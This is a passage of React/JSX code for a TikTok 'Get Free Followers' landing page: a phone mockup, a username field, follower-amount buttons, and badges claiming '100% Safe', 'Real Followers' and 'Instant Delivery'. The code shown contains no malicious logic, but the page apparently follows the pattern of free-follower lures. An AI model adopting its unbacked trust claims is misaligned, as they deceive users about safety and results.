              <div className="relative mx-auto w-[280px]">
                <div className="relative z-10 bg-black rounded-[40px] border-4 border-gray-800 overflow-hidden w-full aspect-[9/19] shadow-2xl">
                  <div className="absolute top-0 inset-x-0 h-6 bg-black rounded-t-2xl"></div>
                  <div className="absolute top-1.5 inset-x-0 flex justify-center">
                    <div className="h-2 w-20 bg-gray-800 rounded-full"></div>
                  </div>
                  <div className="h-full pt-6 bg-gradient-to-b from-gray-900 to-black">
                    <div className="flex justify-between items-center px-4 mb-4">
                      <svg viewBox="0 0 24 24" className="h-6 w-6 fill-current text-white">
                        <path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a6.84 6.84 0 00-1-.05A6.33 6.33 0 005 20.1a6.34 6.34 0 0010.86-4.43v-7a8.16 8.16 0 004.77 1.52v-3.4a4.85 4.85 0 01-1-.1z"/>
                      </svg>
                      <div className="text-white text-sm font-medium">For You</div>
                      <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" className="h-6 w-6 text-white">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                      </svg>
                    </div>
                    
                    <div className="flex-grow flex justify-center items-center h-5/6">
                      <div className="text-center">
                        <div className="w-20 h-20 bg-gradient-to-r from-[#25F4EE] to-[#FE2C55] rounded-full flex items-center justify-center mx-auto mb-5">
                          <TrendingUp className="h-10 w-10 text-white" />
                        </div>
                        <div className="text-xl font-bold text-white mb-2">Get Followers</div>
                        <div className="text-sm text-gray-400">+5000 followers available</div>
                        <div className="animate-bounce mt-6">
                          <Sparkles className="h-6 w-6 text-[#25F4EE] mx-auto" />
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            
            {/* Form */}
            <div className="md:col-span-3">
              <div className="bg-[#1D1D1D] rounded-3xl p-8 shadow-[0_5px_30px_rgba(0,0,0,0.3)] border border-gray-800">
                {formStep === 'form' && (
                  <Form {...form}>
                    <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-7">
                      <FormField
                        control={form.control}
                        name="username"
                        render={({ field }) => (
                          <FormItem className="space-y-3">
                            <FormLabel className="text-lg font-semibold text-white flex items-center">
                              <div className="mr-2 h-6 w-6 rounded-full bg-[#25F4EE] flex items-center justify-center text-black font-bold">@</div>
                              TikTok Username
                            </FormLabel>
                            <div className="relative">
                              <span className="absolute inset-y-0 left-0 pl-5 flex items-center text-gray-400 text-xl">@</span>
                              <FormControl>
                                <Input
                                  placeholder="your_username"
                                  className="w-full h-16 bg-[#0d0d0d] border-2 border-gray-800 hover:border-[#25F4EE] focus:border-[#25F4EE] rounded-2xl py-6 pl-10 pr-3 text-white text-lg placeholder:text-gray-600 focus:outline-none focus:ring-2 focus:ring-[#25F4EE] transition-all"
                                  {...field}
                                />
                              </FormControl>
                            </div>
                            <FormMessage className="text-[#FE2C55] text-sm font-medium" />
                          </FormItem>
                        )}
                      />
                      
                      <div className="space-y-4">
                        <FormLabel className="text-lg font-semibold text-white flex items-center">
                          <div className="mr-2 h-6 w-6 rounded-full bg-[#FE2C55] flex items-center justify-center text-white font-bold">+</div>
                          Select Followers
                        </FormLabel>
                        <div className="grid grid-cols-3 gap-4">
                          <Button
                            type="button"
                            variant="outline"
                            onClick={() => selectFollowerAmount(1000)}
                            className={`
                              h-16 bg-[#0d0d0d] border-2 ${selectedAmount === 1000 ? 'border-[#25F4EE]' : 'border-gray-800'} 
                              rounded-2xl py-3 text-xl font-bold text-center transition-all hover:border-[#25F4EE] hover:bg-[#161616]
                            `}
                          >
                            1,000
                          </Button>
                          <Button
                            type="button"
                            variant="outline"
                            onClick={() => selectFollowerAmount(2500)}
                            className={`
                              h-16 bg-[#0d0d0d] border-2 ${selectedAmount === 2500 ? 'border-[#25F4EE]' : 'border-gray-800'} 
                              rounded-2xl py-3 text-xl font-bold text-center transition-all hover:border-[#25F4EE] hover:bg-[#161616]
                            `}
                          >
                            2,500
                          </Button>
                          <Button
                            type="button"
                            variant="outline"
                            onClick={() => selectFollowerAmount(5000)}
                            className={`
                              h-16 bg-[#0d0d0d] border-2 ${selectedAmount === 5000 ? 'border-[#25F4EE]' : 'border-gray-800'} 
                              rounded-2xl py-3 text-xl font-bold text-center transition-all hover:border-[#25F4EE] hover:bg-[#161616] relative overflow-hidden
                            `}
                          >
                            5,000
                            {selectedAmount === 5000 && (
                              <div className="absolute -top-1 -right-1 h-5 w-5 bg-[#FE2C55] rounded-full flex items-center justify-center text-white text-xs font-bold">
                                <CheckCircle className="h-3 w-3" />
                              </div>
                            )}
                          </Button>
                        </div>
                      </div>
                      
                      <Button 
                        type="submit" 
                        className="w-full h-16 bg-gradient-to-r from-[#25F4EE] to-[#FE2C55] hover:from-[#20E5DF] hover:to-[#F01B48] text-white text-xl font-bold py-4 rounded-2xl transition-all transform hover:scale-[1.02] focus:outline-none"
                        disabled={mutation.isPending}
                      >
                        {mutation.isPending ? (
                          <>
                            <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                            Processing...
                          </>
                        ) : (
                          <>
                            <Sparkles className="mr-2 h-5 w-5" />
                            Get Free Followers
                          </>
                        )}
                      </Button>
                      
                      <div className="flex items-center justify-center gap-4 pt-2">
                        <div className="flex items-center text-gray-400 text-sm">
                          <ShieldCheck className="mr-1 h-4 w-4 text-[#25F4EE]" /> 100% Safe
                        </div>
                        <div className="flex items-center text-gray-400 text-sm">
                          <Lock className="mr-1 h-4 w-4 text-[#25F4EE]" /> No Password Required
                        </div>
                      </div>
                    </form>
                  </Form>
                )}
                
                {formStep === 'processing' && <ProcessingAnimation />}
                
                {formStep === 'success' && (
                  <SuccessMessage 
                    username={form.getValues("username")} 
                    followers={selectedAmount.toString()} 
                  />
                )}
              </div>
            </div>
          </div>
          
          {/* Trust signals */}
          <div className="mt-12 text-center">
            <div className="flex flex-wrap justify-center gap-6 md:gap-10">
              <div className="flex items-center gap-2">
                <CheckCircle className="h-5 w-5 text-[#25F4EE]" />
                <span className="text-gray-300">Real Followers</span>
              </div>
              <div className="flex items-center gap-2">
                <ShieldCheck className="h-5 w-5 text-[#25F4EE]" />
                <span className="text-gray-300">100% Secure</span>
              </div>
              <div className="flex items-center gap-2">
                <Flame className="h-5 w-5 text-[#FE2C55]" />
                <span className="text-gray-300">Instant Delivery</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
}
